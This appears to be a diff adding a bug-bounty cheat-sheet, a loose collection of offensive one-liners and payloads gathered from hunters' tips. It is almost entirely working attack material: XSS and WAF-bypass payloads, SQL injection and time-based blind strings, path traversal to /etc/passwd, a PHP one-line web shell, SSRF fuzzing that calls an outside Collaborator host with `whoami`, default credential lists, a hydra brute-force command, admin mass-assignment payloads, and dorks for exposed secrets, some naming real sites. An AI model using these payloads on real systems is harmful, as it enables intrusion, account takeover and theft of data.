@@ -1,0 +1,578 @@
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin" (to get direct admin page)
+
+cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443  | anew myP1s.txt
+
+echo https://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq (for automation)
+
+grep -Rw <GitlabRepoPath> -e ‘log4j’ (https://medium.com/@pranav-gajjar/how-did-i-find-log4j-vulnerability-via-static-code-analysis-and-received-bounty-94f4d86cea88)
+
+
+new paylaod was %0aonload=alert(1) (with https://www.acronis.com/%0aonload=alert(1) endpoint) and I got a 302 code, location was https://www.acronis.com/en-us/en-us/%0aonload=alert(1)
+
+
+`"‘><img src=x onerror=promtp(7)>`"’${{8*8}} (I recommend my friends to use a magic payload that leads to testing many vulnerabilities in a inject.)
+
+" onmo<x>useover="alert(document[‘cookie’])">
+
+" onf<x>ocus="alert(document[‘cookie’])" autofocus">
+
+https://[REDACTED]/eam/vib?id=C:/WINDOWS/System32/drivers/etc/hosts
+
+https://[REDACTED]/web/product_logo?logo=../../../../../../../../../../WINDOWS/System32/drivers/etc/hosts
+
+
+https://[REDACTED]/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
+
+'; WAITFOR DELAY '00:00:10'-- -
+
+------------------------------------------------------------------------------------------------
+I detect XSS vulnerabilities using a fairly simple payload like d0mxss'"><. This payload allows me to find out the context in which the input is reflected. I used the same payload to detect this XSS. The payload was reflected in an input tag like:
+
+<input name="E-mail" value="d0mxss'"><">
+
+The ASP.NET WAF blocked common payloads like " onclick="alert(1). To bypass the WAF, I used the following payload:
+
+" onmouseenter="alert(document.domain)
+
+The above payload will make the reflected HTML look like:
+
+<input name="E-mail" value="" onmouseenter="alert(document.domain)">
+
+When the user moves the pointer above the E-mail input, the XSS gets triggered.
+
+---------------------------------------------------------------------------------------------------
+
+https://0xpatrik.com/
+
+')*alert(1)*v.SS('.mp4
+https://exchangemarketplace.com/blogsearch?q=OnMoUsEoVeR=prompt(/hacked/)//
+
+"&gt;&lt;img src=x onerror=alert(document.domain)&gt;
+quot;&amp;gt;&amp;lt;img src=x onerror=alert(document.domain)&amp;gt
+X-Forwarded-For: xss><svg/onload=globalThis[`al`+/ert/.source]`1`// 
+
+-------------------------blind ssrf-----------------------------------
+gau --subs example.com; subfinder -d example.com -silent |waybackurls | gf ssrf | sort -u >> testblindssrf.txt
+
+cat testblindssrf.txt | qsreplace "http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt
+
+ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+
+http:/devtest.exampl.com/import/picture?next_image=http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net?`whoami`
+
+----------------------------------------------------------------------
+
+So the final command will look like this:
+
+gau -subs indusind.com | unfurl domains>> vul1.txt
+
+waybackurls indusind.com | unfurl domains >> vul2.txt
+
+subfinder -d indusind.com -silent >> vul3.txt
+
+Now collecting all subdomain in one and sorting out the duplicates
+cat vul1.txt vul2.txt vul3.txt | sort -u >> unique_sub.txt
+
+nuclei -l subdomains.txt -t /home/kali/nuclei-templates
+
+
+Need to port scan for http services real quick and nmap's too slow? ffuf got ya covered. 
+Command: 
+seq 1 65535 | ffuf -w - -u https://target.com:FUZZ/ 
+
+
+cat live-subs | aquatone -scan-timeout 3000 -threads 5 -silent -screenshot-timeout 50000 -http-timeout 20000 -out screenshots-folder
+
+cat all-subdomains.txt | uniq | httpx -silent -mc 200,302,404,403,401,400 -threads 70 | cut -d "/" -f 3 | uniq | aquatone -scan-timeout 3000 -threads 5 -silent -screenshot-timeout 50000 -http-timeout 20000 -out subdomains-screenshots
+
+
+site:http://target.com "non-disclosure agreement" ext:pdf
+
+amass enum -brute -w list.txt -d target.com (for bruteforce subdomains if you have list of subdomains for bruteforce like list.txt)
+
+You can identify by doing
+
+    Directory Brute forcing (i.e. /phpMyAdmin/)
+    Nmap (Ports i.e. 8081, 9090, 2086)
+    Shodan (query: http.component:phpMyAdmin)
+    Google Dork (Inurl:/phpMyAdmin Intitle:phpMyAdmin), etc.
+
+    Authentication bypass using root array:✅
+▶️Change the data from
+{"email":"test@gmail.com","password":"test"}to be like that:
+▶️{"root": {
+  "password": "test",
+  "email": "test@gmail.com"
+}}
+
+
+sortest payload for remote code execution is  <?=`$_GET[1]`?>
+
+
+Want to do dir bruteforcing and parameter bruteforcing at the same time?
+
+GET
+ffuf -w "./dir.txt:DIR" -w ./params.txt -u https://EXAMPLE(.)COM/DIR?FUZZ=1 -t 300 -ac
+
+POST
+ffuf -w "./dir.txt:DIR" -w ./params.txt -u https://EXAMPLE(.)COM/DIR -X POST -d "FUZZ=1" -t 300 -ac
+
+
+
+
+Found Admin panel? go for Default Creds 🔥🔥🔥
+admin:admin
+admin:a
+admin:12346578
+test:test
+guest:guest
+anonymous:anonymous
+admin:password
+admin:
+root:toor
+root:passw0rd
+root:root
+guest:test
+$sub_name:password
+ADMIN:ADMIN
+Admin:Admin
+:
+a:a
+
+wpscan — url https://zerodha.com/varsity -e vp — api-token YOUR-API-TOKEN — random-user-agent — ignore-main-redirect — force — disable-tls-checks
+
+finding sudomains using web archieves
+
+curl -s "http://web.archive.org/cdx/search/cdx?url=*.hackerone.com/*&output=text&fl=original&collapse=urlkey"  |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | uniq
+
+private webapp admin access endpoint
+
+/dev/register/
+/stag/register/
+/dev/login/
+/register/
+/internal/
+/stag/
+
+private webapp admin access subdomains
+
+dev.
+stag.
+admin.
+internal.
+stag-dev.
+stag-admin.
+internal-dev.
+
+
+1st: collect all ip's from shodan
+shodan search http://Ssl.cert.subject.CN:"http://target.com*" 200 --fields ip_str | httpx | tee ips.txt
+
+missing spf records check ---> http://www.kitterman.com/spf/validate.html
+blc -rof --filter-level 3 https://example.com/ (broken link checker command)
+
+echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh (xss)
+
+I earned $800 for my submission on @bugcrowd
+ #ItTakesACrowd 
+Tips:
+1) Used Gau To Get All The URLS
+2) Used grep = Filtered Only URLS with Parameter
+3) Used KXSS Got Reflection Allowing " < > ' 
+5) Tested XSS
+6) Boom!
+
+
+#Create a list of resolvers
+
+dnsvalidator -tL https://public-dns.info/nameservers.txt -threads 100 -o dns-resolvers.txt
+
+#resolve subdomains
+
+puredns resolve subdomains.txt -r dns-resolvers.txt -w resolved.txt
+
+'+union+select+'a'+from+users+where+username='administrator'+AND+substring(password,1,1)='a'--
+
+
+Some google dorks for finding sensitive files:
+
+intitle:"index of" "WebServers.xml"
+filetype:xls inurl:"email.xls"
+intitle:"Index of" wp-admin
+intitle:"index of" "admin/sql/"
+intitle:"index of" "system/config"
+
+cat file.txt | gf xss | grep ‘source=’ | qsreplace ‘"><script>confirm(1)</script>’ | while read host do ; do curl –silent –path-as-is –insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host 33[0;31mVulnerablen";done  (xss)
+
+findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net (ssrf)
+
+findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr "root:x" -w ~/wordlist/LFI.txt ; done(lfi)
+
+
+‘+(select*from(select(sleep(20)))a)+’
+
+site:http://company.com ext:log
+site:http://company.com inurl:redir | inurl:redirect | inurl:return | inurl:to
+site:http://company.com ext:doc | ext:docx | ext:odt | ext:pd
+site:http://company.com ext:sql
+
+target.com: ext:pdf "confidential"
+
+in wordpress always look for 
+
+https://www.site.com(/wp-json/wp/v2/users/)
+Don't forget to check for the /_wpeprivate/config.json endpoint on a website for information disclosure.
+
+
+subfinder -d ups.com -all -silent | waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain' (for open redirect)
+
+cat scope | passivesubdomain finding tools | waybackurls | grep "=" | kxss
+
+"inurl: /sym404/root/" "*.example.com"(google dork)
+
+"inurl: /sym404/root/" or "inurl: /sym404/"
+
+------------for wordpress webstie ------
+
+site.com/wp-includes/sym404/root/etc/passwd
+
+shodan dork : ssl:"redacted.com" 200
+
+curl https://lahitapiolarahoitus.fi/?_method=GET -d rest_route=/wp/v2/users
+
+/wp-admin/admin.php?page=tp_editor&orderby=lang&orderby=lang&order=asc,(SELECT%20(CASE%20WHEN%20(1=1)%20THEN%20SLEEP(10)%20ELSE%202%20END))
+
+site[.]com/env => 403 Forbidden 
+site[.]com/env/HTTPS2 => Bypassed
+
+wpscan --url https://target.com --disable-tls-check --enumerate u (for wpScan)
+
+cat urls | unfurl format %q | cut -d "=" -f1 | sort -u > params.txt(one liner for generate wordlist)
+
+{"root": {
+  "password": "test",
+  "email": "test@aykalam.com"
+}}
+
+One way to find information disclosure vulnerabilities is to change the header.
+Change the Accept header to:
+
+Accept: application/json, text/javascript, */*; q=0.01 
+
+Some vulnerable servers reveal server version information, stack and route information
+
+
+bruteforcing via suffledns
+
+echo target.com | suffledns -w subomains.txt -r resolvers.txt -v
+
+nuclei 
+
+cat list.txt | nuclei -c 500 -silent -t niclei-templates -o profit
+
+------------------Xss--------------------------------------
+cat file.txt | gf xss | grep ‘source=’ | qsreplace '”><img src=x onerror=alert()>' | while read host do ; do curl –silent –path-as-is –insecure “$host” | grep -qs “<img src=x” && echo “$host 33[0;31mVulnerablen”;done
+------------------------------------------------------------
+---------------------ssrf-----------------------------------
+findomain -t example.com -q | httpx -silent -threads 1000 | gau | grep “=” | qsreplace http://YOUR.burpcollaborator.net
+------------------------------------------------------------
+---------------------------LFI------------------------------
+findomain -t example.com -q | waybackurls |gf lfi | qsreplace FUZZ | while read url ; do ffuf -u $url -mr “root:x” -w ~/wordlist/LFI.txt ; done
+------------------------------------------------------------
+Keywords I used : password, username, mail.com, token, access_token, url=, redirect_url=, api, id=, accessUrl=, payment, etc.
+
+
+POST /api/v1/register
+--snip--
+{
+"username":"hAPI_hacker",
+"email":"hapi@hacker.com",
+"admin": true,
+"admin":1,
+"isadmin": true,
+"role":"admin",
+"role":"administrator",
+"user_priv": "admin",
+"password":"Password1!"
+}
+
+arjun --headers "Content-Type: application/json]" -u http://vulnhost.com/api/register -m JSON
+--include='{$arjun$}'
+
+[~] Analysing the content of the webpage
+[~] Analysing behaviour for a non-existent parameter
+[!] Reflections: 0
+[!] Response Code: 200
+[~] Parsing webpage for potential parameters
+[+] Heuristic found a potential post parameter: admin
+[!] Prioritizing it
+[~] Performing heuristic level checks
+[!] Scan Completed
+[+] Valid parameter found: user
+[+] Valid parameter found: pass
+[+] Valid parameter found: admin
+
+
+
+For all whos asked about command 
+
+You can used a simple command 
+
+ffuf -w wordlist -u target/FUZZ -fs 0,any duplicate size response 
+
+example -fs 0,2134,99
+
+Add "Accept: ../../../../../../../../etc/passwd{{" to GET Request and read /etc/passwd
+API Leaked all Users Secrets:
+
+/v1/org/users=403
+/v1/org/admin/users=401
+/v1.1/org/admin_id/users=200 (blank response)
+/v1.1/org/admin_id/users?FUZZ=FUZZ
+/v1.1/org/admin_id/users?Withrole=true 401(body unauthorised)
+/v1.1/org/admin_id/users?With[mail,credit_card,apikey]=true BOOM
+
+wp user enumeration:
+
+/wp-json/wp/v2/users/
+->
+/wp-json/wp/v2/users/n
+/wp-json/?rest-route=/wp/v2/users/
+/wp-json/?rest_route=/wp/v2/users/n?author=n
+wp-content/debug.log
+
+(n=1,2,3)
+
+
+6h
+Not only crawling but you can do Subdomain Enumeration using Wayback. 
+
+curl --insecure --silent "http://web.archive.org/cdx/search/cdx…" | sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | sed "/@/d" | sed -e 's/\.$//' | sort -u
+
+go install -v github.com/tomnomnom/assetfinder@latest
+/wp-content/debug.log
+
+------------one line probing using httpx----
+
+cat target_subs | httpx -follow-redirects -status-code -vhost -threads 100 -silent | sort -u grep "[200]" | cut -d [ -f1 | sort -u | sed 's/[[:blank:]]*$//' |tee prober.txt
+
+curl -s "https ://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u (Find subdomains from virustotal)
+
+curl -s "https ://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
+
+then simply search site:*.domain.com and get juicy information Index of /conf/logs/
+
+curl -s "https://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
+
+Two best Katana commands according to me.
+ 
+cat httpx.txt | katana -jc -d 5 -c 50 -ef css,woff,woff2,eot,ttf,tiff,tif -kf robotstxt,sitemapxml | grep -v -e "=" >> paths.txt
+
+cat httpx.txt | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml >> fuzzingparameters.txt
+
+echo http://testphp.vulnweb.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -silent | dalfox pipe --skip-bav
+
+find more IDOR 🧙‍♀️
+
+Don’t just replace ID
+/account/1234 --> Forbidden
+Bypass by appending %20, %09, %0b, %0c, %1c, %1d, %1e, %1f, /
+
+Burp Suite Pro Collaborator alternatives for out of Band exploitation 🔥🔥🔥
+1. https://webhook.site
+2. https://requestcatcher.com
+3. https://canarytokens.org/generate
+4. http://dnsbin.zhack.ca
+5. https://ngrok.com 
+
+Gather Domains from Content-Security-Policy
+#bugbounty #Infosec
+
+curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
+
+“powered by bugcrowd” -site:bugcrowd.com
+
+“powered by hackerone” “submit vulnerability report”
+
+1-collect all subdomains
+
+2-scan full port
+
+naabu -p --list-subs.txt -exclude-ports 80,443,8443,21,25,22 -o ports.txt
+
+Extract Hidden Parameters From URL List
+
+cat alive.txt | rush ‘curl -skL “{}” | grep “type\=\”hidden\”” | grep -Eo “name\=\”[^\”]+\”” | cut -d”\”” -f2 | sort -u’ | anew params.txt
+
+{ One-Liner } - Extract End-Points From Js File 
+
+by @renniepak
+ 
+
+➡️ cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
+
+{ One-Liner } - Extract all URL from Source Code
+
+➡️  curl "https://example .com/" | grep -oP '(https*://|www\.)[^ ]*'
+
+# Greather all panel stuff from Gau/wayback urls
+cat gau-urls.txt | grep -i "login\|singup\|admin\|dashboard\|wp-admin\|singin\|adminer\|dana-na\|login/?next/=" | sort | uniq > gau-panel.txt
+# Html DEV comments grep
+cat target-domain.txt | xargs -I@ sh -c 'curl -v --stderr - @ | grep "<\!--" && echo @' > target-domains-html-comments.txt
+(/2)
+# Uncover
+while read -r line; do uncover -q "$line" -e fofa,censys | uniq; done < all-domains.txt > all-domains-ips-uncover.txt
+(3/)
+# FFUF
+for url in $(cat targets.txt); do ffuf -ac -fc 404,403 -w wordlist.txt -u $url/FUZZ >> results.txt; done && sort -u results.txt | grep -E '^https?://' > results.txt
+(4/)
+
+1- url/FUZZ 
+2- url/web/admin/home
+3- Found login 
+4- Enter [ admin@domain .com :: Admin@1 ]
+
+) greped all urls from wayback urls/ gau
+2) collected all js file ".js" 
+3) filter js file " httpx -content-type | grep 'application/javascript'"
+4) performed nuclei scan "nuclei -t /root/nuclei-templates/exposures/"
+
+dirsearch.py -e php,aspx,asp,txt,bak -u $url | tee ./bruteforce/$url-dirsearch.txt;
+
+/wp-config,txt
+/wp-config.zip
+/wp-config.md
+/wp-config.php_orig
+/wp-config.bak
+
+hydra domain.tld https-form-post “/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log 
+In&testcookie=1:S=Location” -l bob -P /usr/share/wordlists/hack.txt -f
+
+
+Here's a one liner 🔥🔥🔥🔥
+echo targetdomain[.]com | gau | grep ".js"  |  httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei  -t /root/nuclei-templates/exposures/ -silent  > secrets.txt
+
+ intext:"company[.]com" & ext:txt | ext:sql | ext:cnf | ext:config | ext:log & intext:"admin" | intext:"root" | intext:"administrator" & intext:"password" | intext:"root"
+
+ cat subs.txt | sed 's@$@/.git/config@'  | httpx -fr -mc 200
+ 
+naabu -list Target.txt -p - -exclude-ports 80,443,21,22,25 -o Target-ports.txt | httpx -l Target-ports.txt -o Critical-Domains.txt 
+
+cat domain| katana -silent| while read url; do cu=$(curl -s $url | grep -E '(token|api|key|cred|pass|email|user|secret)';echo -e "==> $url" "\n"" $cu"; done
+
+
+1 : Get all the URL from wayback / Gau 
+2 : Filter out the js file using httpx 
+3 : Check Mnauly all the js file or you can use nuclei template or used @trufflesec
+ chrome extension
+
+ wp-content/debug.log
+
+ Some Important paths for accessing #phpmyadmin
+admin/phpMyAdmin/setup/index.php
+phpMyAdmin/main.php
+phpmyadmin/pma/
+Admin/setup/index.php
+phpmyadmin/admin/setup/index.php
+phpmyadmin/setup/
+phpmyadmin/setup/index.php
+
+
+Search for all leaked keys/secrets using one regex! 
+
+rejex -->https://gist.github.com/h4x0r-dz/be69c7533075ab0d3f0c9b97f7c93a59
+
+katana -u http://www-uat.example.com -d 5 -do | unfurl -u paths > paths.txt ; ffuf -w paths.txt -u http://example.com
+
+1) greped all urls from wayback urls/ gau
+2) collected all js file ".js" 
+3) filter js file " httpx -content-type | grep 'application/javascript'"
+4) performed nuclei scan "nuclei -t /root/nuclei-templates/exposures/"
+#bugbountytips #BugBounty
+Access token leak at js file⚔️🛡️
+1) greped all urls from wayback urls/ gau
+2) collected all js file ".js" 
+3) filter js file " httpx -content-type | grep 'application/javascript'"
+4) performed nuclei scan "nuclei -t /root/nuclei-templates/exposures/"
+https://uuidtools.com/decode
+
+If you run a bruteforce and notice weird behaviours - like "/admin/" redirecting to / always investigate these.
+
+/admin/
+/admin/../admin
+//admin/
+/Admin/
+/admin;/
+/Admin;/
+/index.php/admin/
+/admin/js/*.js
+/admin/*brute*.ext
+/admin../admin
+//anything/admin/
+
+/ConfigurePortalPages!default.jspa?view=popular(unauthenticated jira instance which could leak email,name etc)
+
+curl -H “content-type: application/json” -H “X-Api-Key: yourAPIkey” -X GET https://api.target.com/api/v1/user 
+
+https://subdomain[.]target[.].com/jira/issues/?filter=
+OR
+https://subdomain[.]target[.].com/issues/?filter=
+wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+
+cat file.js | grep -Eo "(http|https)://[a-zA-z0-9./?=_.]*"*
+
+
+-----------------------------------------------------------------
+
+we all try to change the values of parameters to find vulnerabilites, but did you know that you can also try to change the name of the parameter?
+
+eg-> 
+
+?parameter=123 ==> 200 OK
+?parameter[]=123 ==> Bypass protection?
+>paramter[id']=123 ==> SQL injection
+
+ It's not perfect but I found an authorization bypass using the following command:
+
+echo waybackurls |grep -i "/admin/|/administrator/" | httpx -title -sc -lc -nc -silent | sed 's/[][]//g' |awk '$NF > 10000' |egrep ' 200| 301| 302' | cut -d ' ' -f1
+
+dirsearch.py -l target.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 — full-url
+
+Found a directory listing?
+You can use `wget -r --no-parent http://target.com/dir` to recursively fetch all the files (+structure) to your machine.
+
+
+Easy way to find Kubernetes:-
+
+port:"10250"
+
+install 
+@shodanhq
+
+ 
+install httpx 
+@pdiscoveryio
+
+
+Change the org to your target and run:-
+
+
+shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
+
+BugBounty's tip for today <3
+
+always after running waybackruls, katana, etc...
+try to find secret files by running:
+
+grep "\.txt"
+~ "\.log"
+~ "\.cache"
+~ "\.secret"
+~ "\.db"
+~ "\.backup"
+~ "\.yml"
+~ "\.json"
+~ "\.gz"
+~ "\.rar"
+~ "\.zip"
+~ "\.config"
